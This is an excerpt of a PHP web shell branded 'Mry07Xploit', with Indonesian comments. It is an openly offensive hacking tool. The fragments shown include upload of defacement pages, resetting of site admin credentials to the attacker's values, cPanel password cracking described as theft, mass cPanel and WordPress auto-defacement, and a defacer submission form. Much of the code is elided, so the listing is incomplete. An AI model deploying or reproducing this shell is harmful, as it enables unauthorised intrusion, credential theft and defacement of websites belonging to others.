<html>
<head>
<title>Mry07Xploit</title>
<meta name='author' content='Mry07Xploit'>
<meta charset="UTF-8">
<style type='text/css'>
...
// Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools saya ambil dari shell yang sudah ada.
...
if($_GET['do'] == 'upload') {
    ...
    <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Mry07Xploit</textarea><br>
    ...
    if($_POST['hajar']) {
        ...
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='Mry07Xploit' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='Mry07Xploit' placeholder='pass_baru'><br>
    ...
    if($_POST['crack']) {
        ...
        if($i == 0) {
            ...
            echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>Mry07Xploit.</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
    ...
    if($_POST['crack']) {
        ...
        if($i == 0) {
            ...
            echo "<br>sukses deface ".$i." Cpanel by <font color=lime>Mry07Xploit.</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
    ...
    if($_POST['hajar']) {
        ...
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set Title: <br>
        <input type='text' name='new_title' value='Hacked by Mry07Xploit' placeholder='New Title'><br><br>
    ...
    if($_POST['submit']) {
        ...
        <u>Defacer</u>: <br>
        <input type='text' name='nick' size='50' value='Mry07Xploit'><br>
        <u>Domains</u>: <br>
    ...
    if($_POST['auto_deface_wp']) {
        ...
        <input type='text' name='script' height='10' size='50' placeholder='Hacked by Mry07Xploit' required><br>
    ...
    echo "<center>Copyright &copy; ".date("Y")." - <a href='http://forum.Mry07Xploit.or.id/' target='_blank'><font color=lime>Mry07Xploit</font></a></center>";
}
?>
</html>